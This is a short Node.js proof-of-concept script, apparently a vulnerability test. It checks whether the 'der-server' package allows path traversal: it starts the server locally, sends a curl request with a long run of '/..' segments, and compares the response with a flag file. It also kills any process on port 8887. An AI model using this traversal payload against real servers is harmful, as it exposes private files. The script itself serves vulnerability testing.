const path = require("path");
//const pathToFlag = path.resolve(__dirname, "../flag.html");
const pathToFlag = path.resolve("D:\\flag.html");
function genstr(n) {
  return "/..".repeat(50) + "\\flag.html";
}

// test("Path Traversal in der-server", (done) => {
//   expect.assertions(1);
  var pkg = require("der-server");
  const fs = require("fs");
  const { exec } = require("child_process");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require("child_process");
  try {
    a.execSync("fuser -k 8887/tcp", () => {});
  } catch (e) {}
  pkg.start(__dirname, "../flag.html", 8887);
  let attack_string = `curl -v --path-as-is "http://127.0.0.1:8887${genstr()}"`;
  exec(attack_string, (error, stdout) => {
if (stdout == hostsFile) {
	console.log("this_is_vulnerable")
  process.exit(0);
} else {
	console.log("this_is_OK")
	process.exit(0);
}
//     done();
  });
// });
